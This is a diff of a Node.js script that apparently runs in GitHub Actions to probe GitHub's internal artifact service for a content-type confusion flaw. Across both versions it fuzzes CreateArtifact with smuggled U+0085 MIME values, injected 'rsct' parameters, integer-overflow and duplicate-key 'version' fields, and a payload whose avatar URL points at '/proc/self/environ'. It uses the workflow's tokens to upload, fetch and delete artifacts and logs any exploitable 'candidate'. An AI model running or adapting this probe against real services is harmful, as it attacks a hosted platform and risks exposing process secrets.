@@ -1,104 +1,62 @@
 import { BlobClient } from '@azure/storage-blob';
 import { internalArtifactTwirpClient } from './node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
 import { getBackendIdsFromToken } from './node_modules/@actions/artifact/lib/internal/shared/util.js';
-import { StringValue } from './node_modules/@actions/artifact/lib/generated/index.js';
 
-const twirp = internalArtifactTwirpClient();
+const client = internalArtifactTwirpClient();
 const backend = getBackendIdsFromToken();
-const repo = process.env.GITHUB_REPOSITORY;
-const root = `https://api.github.com/repos/${repo}`;
-const weird = '\u0085application/json';
-const token = process.env.GITHUB_TOKEN;
-const pause = ms => new Promise(resolve => setTimeout(resolve, ms));
-const headers = {
-  Authorization: `Bearer ${token}`,
+const endpoint = new URL('/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact', process.env.ACTIONS_RESULTS_URL);
+const root = `https://api.github.com/repos/${process.env.GITHUB_REPOSITORY}`;
+const ghHeaders = {
+  Authorization: `Bearer ${process.env.GITHUB_TOKEN}`,
   Accept: 'application/vnd.github.v3+json',
-  'User-Agent': 'repo-cassette-transient-probe',
+  'User-Agent': 'repo-cassette-version-probe',
 };
 
-function payload(id) {
-  return Buffer.from(JSON.stringify({
-    full_name: `${repo}/actions/artifacts/${id}/zip`,
-    owner: { avatar_url: 'file:///proc/self/environ' },
-  }));
-}
-
-async function create(name, version) {
-  const mime = version === 6 ? weird : 'application/json';
-  const result = await twirp.CreateArtifact({
-    ...backend, name, version, mimeType: StringValue.create({ value: mime }),
-  });
-  console.log('CREATE_REPLY', JSON.stringify({version,keys:Object.keys(result),artifactId:result.artifactId??null}));
-  if (!result.ok || !result.signedUploadUrl) throw Error(`Create v${version} failed`);
-  return { version, url: result.signedUploadUrl, artifactId:result.artifactId??null };
-}
-
-async function upload(url, data) {
-  const blob = new BlobClient(url).getBlockBlobClient();
-  await blob.uploadData(data, {
-    blobHTTPHeaders: { blobContentType: weird },
-  });
-}
-
-async function finalize(name, size) {
-  const result = await twirp.FinalizeArtifact({ ...backend, name, size: String(size) });
-  if (!result.ok || !result.artifactId) throw Error('Finalize failed');
-  return String(result.artifactId);
-}
-
-async function inspect(id) {
-  const first = await fetch(`${root}/actions/artifacts/${id}/zip`, {
-    headers, redirect: 'manual', signal: AbortSignal.timeout(4000),
-  });
-  if (first.status !== 302) return { id, status: first.status };
-  const location = first.headers.get('location');
-  if (!location?.startsWith('https://')) return { id, status: first.status, error: 'no https location' };
-  const response = await fetch(location, { signal: AbortSignal.timeout(4000) });
-  const data = Buffer.from(await response.arrayBuffer());
-  const ct = response.headers.get('content-type') ?? '';
-  const head = ct.split(',')[0].split(';')[0];
-  const js = head.trim().toLowerCase();
-  const py = head.replace(/^[\s\u0085]+|[\s\u0085]+$/gu, '').toLowerCase();
-  return {
-    id, status: response.status, ct, match: data.equals(payload(id)),
-    candidate: response.ok && data.equals(payload(id)) && js !== 'application/json' && py === 'application/json',
-  };
-}
-
-async function remove(id) {
-  const response = await fetch(`${root}/actions/artifacts/${id}`, {
-    method: 'DELETE', headers, signal: AbortSignal.timeout(4000),
-  });
-  console.log('DELETE', JSON.stringify({ id, status: response.status }));
-}
-
-
-
-
-const cases=[
-  'application/json; x="&rsct=application/json%85"',
-  'application/json; x="&rsct=%85application/json"',
-  'application/json; x="&response-content-type=application/json%85"',
-  'application/json; boundary="foo&rsct=application/json%85"',
-  'application/json; charset="utf-8&rsct=application/json%85"',
-  'application/json; x="%26rsct%3Dapplication%2Fjson%2585"',
-  'application/json; x="?rsct=application/json%85"',
-  'application/json; x=";rsct=application/json%85"',
-  'application/json; x="\\&rsct=application/json%85"',
+const variants = [
+  ['v7-number', '7'],
+  ['v7-float', '7.0'],
+  ['v7-string', '"7"'],
+  ['v7-exponent', '7e0'],
+  ['v7-plus-wrap', '4294967303'],
+  ['v7-minus-wrap', '-4294967289'],
+  ['v7-int32-wrap', '2147483655'],
+  ['v7-int64-wrap', '18446744073709551623'],
+  ['v7-fraction', '7.0000000001'],
+  ['v6-float', '6.9999999999'],
+  ['v7-null', 'null'],
+  ['v7-duplicate', '7,"version":6'],
+  ['v6-duplicate', '6,"version":7'],
 ];
-for (let i=0;i<cases.length;i++) {
-  const name=`mime-${process.env.GITHUB_RUN_ID}-${i}`;
-  const mime=cases[i];
+
+for (const [label, rawVersion] of variants) {
+  const name = `version-${process.env.GITHUB_RUN_ID}-${label}`;
+  const fields = JSON.stringify({ ...backend, name }).slice(0, -1);
+  const body = `${fields},"version":${rawVersion},"mimeType":"application/json\\u0085"}`;
   try {
-    const reply=await twirp.CreateArtifact({...backend,name,version:7,mimeType:StringValue.create({value:mime})});
-    console.log('MIME_RESULT',JSON.stringify({i,mime,ok:reply.ok,keys:Object.keys(reply)}));
-    if(reply.ok&&reply.signedUploadUrl){
-      await upload(reply.signedUploadUrl,Buffer.from('{}'));
-      const id=await finalize(name,2);
-      const first=await fetch(`${root}/actions/artifacts/${id}/zip`,{headers,redirect:'manual'}); const loc=first.headers.get('location'); const u=loc?new URL(loc):null; console.log('MIME_DOWNLOAD',JSON.stringify({i,id,rsct:u?.searchParams.getAll('rsct')??[],...await inspect(id)}));
-      await remove(id);
+    const response = await fetch(endpoint, {
+      method: 'POST',
+      headers: { Authorization: `Bearer ${process.env.ACTIONS_RUNTIME_TOKEN}`, 'Content-Type': 'application/json' },
+      body,
+      signal: AbortSignal.timeout(8000),
+    });
+    const result = await response.json();
+    if (!response.ok || !result.ok || !result.signedUploadUrl) {
+      console.log('VERSION_REJECT', JSON.stringify({ label, status: response.status, error: result.msg || result.message || result.code }));
+      continue;
     }
-  }catch(e){console.log('MIME_ERROR',JSON.stringify({i,mime,error:String(e).slice(0,180)}));}
+    const blob = new BlobClient(result.signedUploadUrl).getBlockBlobClient();
+    await blob.uploadData(Buffer.from('{}'));
+    const finished = await client.FinalizeArtifact({ ...backend, name, size: '2' });
+    const id = finished.artifactId;
+    const first = await fetch(`${root}/actions/artifacts/${id}/zip`, { headers: ghHeaders, redirect: 'manual' });
+    const location = first.headers.get('location');
+    const second = location ? await fetch(location) : null;
+    const ct = second?.headers.get('content-type') ?? '';
+    const target = location ? new URL(location) : null;
+    console.log('VERSION_ACCEPT', JSON.stringify({ label, id, redirect: first.status, status: second?.status, ct, rsct: target?.searchParams.getAll('rsct') }));
+    if (ct.includes('\u0085')) console.log('VERSION_CANDIDATE', JSON.stringify({ label, id, ct }));
+    if (id) await fetch(`${root}/actions/artifacts/${id}`, { method: 'DELETE', headers: ghHeaders });
+  } catch (error) {
+    console.log('VERSION_ERROR', JSON.stringify({ label, error: String(error).slice(0, 240) }));
+  }
 }
-console.log('MIME_SUMMARY',JSON.stringify({attempts:cases.length}));
-process.exit(0);
